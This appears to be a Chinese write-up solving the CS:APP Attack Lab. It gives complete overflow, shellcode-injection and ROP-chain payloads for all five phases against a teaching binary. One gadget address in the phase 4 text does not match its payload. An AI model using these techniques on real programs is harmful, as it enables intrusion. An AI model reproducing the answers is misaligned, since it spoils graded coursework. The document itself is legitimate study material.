# attack

## ctarget

在 `stable_launch` 这个函数中, 栈被迁移到一块可执行内存区域, 从而绕过了现代操作系统默认的 NX 保护.

加之, 栈的起始地址被固定了, 这使得将代码注入到栈上成为可能.

```sh
cat ans | ./hex2raw | ./ctarget -q
```

### Phase 1

函数 `getbuf` 当中调用了无缓冲区溢出检查的函数 `Gets`, 它所写入的缓冲区是 `%rdi`, 而代码中只为其分配了 40 个字节:

```asm
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             subq   $0x28,%rsp
  4017ac:       48 89 e7                movq   %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          movl   $0x1,%eax
  4017b9:       48 83 c4 28             addq   $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop

00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             subq   $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:       00 00 00
  4017ce:       bf c5 30 40 00          movl   $0x4030c5,%edi
  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          movl   $0x1,%edi
  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:       bf 00 00 00 00          movl   $0x0,%edi
  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>
```

因此, 做法是劫持 `4017bd` 的返回地址, 将其修改为 `4017c0`.

攻击 payload 是 40 个字节的填充以及 8 个字节的返回地址:

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
c0 17 40 00 00 00 00 00
```

### Phase 2

```asm
00000000004017ec <touch2>:
  4017ec:       48 83 ec 08             subq   $0x8,%rsp
  4017f0:       89 fa                   movl   %edi,%edx
  4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:       00 00 00
  4017fc:       3b 3d e2 2c 20 00       cmpl   0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:       75 20                   jne    401824 <touch2+0x38>
  401804:       be e8 30 40 00          movl   $0x4030e8,%esi
  401809:       bf 01 00 00 00          movl   $0x1,%edi
  40180e:       b8 00 00 00 00          movl   $0x0,%eax
  401813:       e8 d8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401818:       bf 02 00 00 00          movl   $0x2,%edi
  40181d:       e8 6b 04 00 00          callq  401c8d <validate>
  401822:       eb 1e                   jmp    401842 <touch2+0x56>
  401824:       be 10 31 40 00          movl   $0x403110,%esi
  401829:       bf 01 00 00 00          movl   $0x1,%edi
  40182e:       b8 00 00 00 00          movl   $0x0,%eax
  401833:       e8 b8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401838:       bf 02 00 00 00          movl   $0x2,%edi
  40183d:       e8 0d 05 00 00          callq  401d4f <fail>
  401842:       bf 00 00 00 00          movl   $0x0,%edi
  401847:       e8 f4 f5 ff ff          callq  400e40 <exit@plt>
```

文档中给了提示:

> You will want to position a byte representation of the address of your injected code in such a way that `ret` instruction at the end of the code for `getbuf` will transfer control to it.

采用 LLDB 调试, 在 `getbuf` 处下断点, 因此看到 `%rsp` 是定值 `0x000000005561dca0`, 可以将代码注入到栈上, 通过 `ret` 到对应地址来利用.

在栈上注入的代码为:

```
0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	movl   $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
```

攻击 payload 是:

```
bf fa 97 b9 59
68 ec 17 40 00
c3
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
78 dc 61 55 00 00 00 00
```

### Phase 3

`touch3` 接受一个存储有 `cookie` 字符串的地址, 在之前, 我们只修改过寄存器, 这次还需要修改栈内容, 并且注意到提示:

> When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`.

因此要写入到更深的栈, 即 `getbuf` 的调用者 `test` 的栈帧 `0x5561dca8`.

攻击 payload 是:

```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41

78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

执行时, `getbuf` 首先返回到 `0x5561dc78`, 这个位置接下来执行 shellcode:

```
0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	movq   $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```

由于 `touch3` 传递的第一个参数是字符串的地址, 这里把字符串放在栈上, 并且将地址 `0x5561dca8` 赋给 `%rdi`.

## rtarget

### Phase 4

本次的要求同样是触发 touch2, 但这次栈不再能够执行了, 需要利用 gadget. 回忆之前的代码:

```
0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	movl   $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
```

根据提示, 需要在 payload 里面写入 gadget 的地址, 并利用 popq 指令把值写入 `%edi`.

因此, 这次的代码应该是:

```
popq %rax
nop
ret

movl %eax,%edi
nop
ret
```

攻击字符串为 40B 的填充, 以及地址和数据: `0x4019b1`, `0x59b997fa`, `0x4019c6`. 最后跳转到 touch2: `0x4017ec`.

组合后最终的 payload 是:

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c6 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### Phase 5

文档提到参考答案用了 8 个 gadget. 采用技术和上一个并没什么不同.

因为栈指针是随机化的, 所以不能直接计算栈上字符串的地址了, 也许可以将 `%rsp`
的值赋给变量, 比如 `movq %rsp,%rax`. 但能找到的 gadget 在这一步过后都会 `ret`.

所以, 注意到 `farm.c` 里面有 `long add_xy(long, long)` 这个函数可以利用.

以下是攻击的思路:

```
movq %rsp,%rax
movq %rax,%rdi
popq %rax
movl %eax,%edx
movl %edx,%ecx
movl %ecx,%esi
leaq (%rdi,%rsi,1),%rax
movq %rax,%rdi
```

可以看到, 难点在于从 `popq %rax` 到把 `eax` 赋给 `%esi`. 这需要找出单向图中的路径.

最后的 payload 是

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41

06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00

48 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00

35 39 62 39 39 37 66 61
```

其中 `popq %rax` 弹出的值是 `0x48 = 72`,
这是因为从 `movq %rsp,%rax` 到字符串的地址相差 9 条指令.
